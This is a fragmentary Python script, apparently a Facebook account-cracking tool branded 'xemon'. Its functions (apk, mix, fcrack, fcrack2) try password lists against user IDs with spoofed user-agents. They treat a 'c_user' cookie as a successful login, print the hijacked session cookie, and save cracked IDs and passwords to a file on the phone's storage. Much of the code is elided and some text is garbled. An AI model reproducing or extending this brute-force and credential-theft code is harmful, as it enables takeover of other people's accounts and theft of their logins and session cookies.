...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[xemon❤️] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
       ...
       # sys.stdout.write(f" \r{R} [{B}xemon❤️{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/xemon-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [xemon❤️>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
...
def fcrack2(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
               ...
               #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/xemon-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
